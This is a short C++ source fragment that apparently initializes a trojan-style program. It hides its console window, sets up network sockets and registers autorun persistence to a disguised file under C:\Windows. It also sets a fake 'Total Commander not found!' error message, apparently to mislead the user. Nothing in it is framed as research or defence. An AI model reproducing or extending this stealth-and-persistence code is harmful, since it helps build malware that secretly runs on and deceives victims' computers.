#include "init.h"

ProgramSettings Initialize()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	cat_network::InitializeSockets();

	EnableAutorun("C:\\Windows\\NoPlay");

	ProgramSettings settings;
	settings.enableAutorun = true;
	settings.enableMessage = true;
	settings.loopTimer = 100;
	settings.message = "Total Commander not found!";
	settings.makeAction = true;

	return settings;
}
